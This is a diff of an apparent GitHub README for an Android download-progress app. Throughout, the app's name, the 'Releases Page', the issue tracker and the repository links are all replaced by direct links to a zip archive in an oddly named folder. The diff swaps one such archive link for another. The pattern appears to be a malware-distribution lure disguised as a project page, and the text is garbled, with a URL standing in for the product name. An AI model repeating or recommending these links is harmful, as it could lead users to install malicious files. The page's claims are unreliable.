@@ -1,10 +1,10 @@
-# 🚀 https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip - Simplified Download Progress Management 
+# 🚀 https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip - Simplified Download Progress Management 
 
-[![Download Now](https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip)
+[![Download Now](https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip)
 
 ## 📃 Description 
 
-https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip is a tool that helps you track your download progress using an intuitive punch-hole design. This application is tailored for Android users looking for a streamlined experience while downloading files. With this app, you can stay informed about your downloads without the hassle of managing multiple notifications.
+https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip is a tool that helps you track your download progress using an intuitive punch-hole design. This application is tailored for Android users looking for a streamlined experience while downloading files. With this app, you can stay informed about your downloads without the hassle of managing multiple notifications.
 
 ## 💡 Features 
 
@@ -24,10 +24,10 @@ Before you proceed, make sure your device meets these requirements:
 
 ## 🚀 Getting Started 
 
-To start using https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip, follow these straightforward steps:
+To start using https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip, follow these straightforward steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download page:
-   [Download from Releases Page](https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip)
+   [Download from Releases Page](https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip)
 
 2. **Select the Latest Version:** Look for the most recent version listed on the page. It will likely be at the top.
 
@@ -42,8 +42,8 @@ To start using https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/me
 
 ## 📦 Download & Install 
 
-To download and install https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip, please follow this link to the releases page:  
-[Download from Releases Page](https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip)
+To download and install https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip, please follow this link to the releases page:  
+[Download from Releases Page](https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip)
 
 ## ❓ Frequently Asked Questions 
 
@@ -68,7 +68,7 @@ If you encounter any issues:
 
 ## 🌐 Support and Contributions 
 
-Your feedback is valuable. If you have suggestions or encounter issues, please open an issue in our [GitHub repository](https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip). Contributions in the form of bug reports and feature requests are always welcome.
+Your feedback is valuable. If you have suggestions or encounter issues, please open an issue in our [GitHub repository](https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip). Contributions in the form of bug reports and feature requests are always welcome.
 
 ## 📝 Topics 
 
@@ -91,7 +91,7 @@ To better understand the scope of this project, here are some relevant topics co
 
 For more guidance and details, you can explore the following resources:
 
-- GitHub Repository: [https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip](https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip)
+- GitHub Repository: [https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip](https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip)
 - User Guide: Visit the wiki section in our repository for more in-depth instructions.
 
-Your experience with https://raw.githubusercontent.com/dsydev/eu.hxreborn.phdp/main/megalohepatia/phdp_hxreborn_eu_v3.8.zip should be smooth and effective. Enjoy managing your downloads!
+Your experience with https://github.com/dsydev/eu.hxreborn.phdp/raw/refs/heads/main/megalohepatia/hxreborn_phdp_eu_v2.5.zip should be smooth and effective. Enjoy managing your downloads!
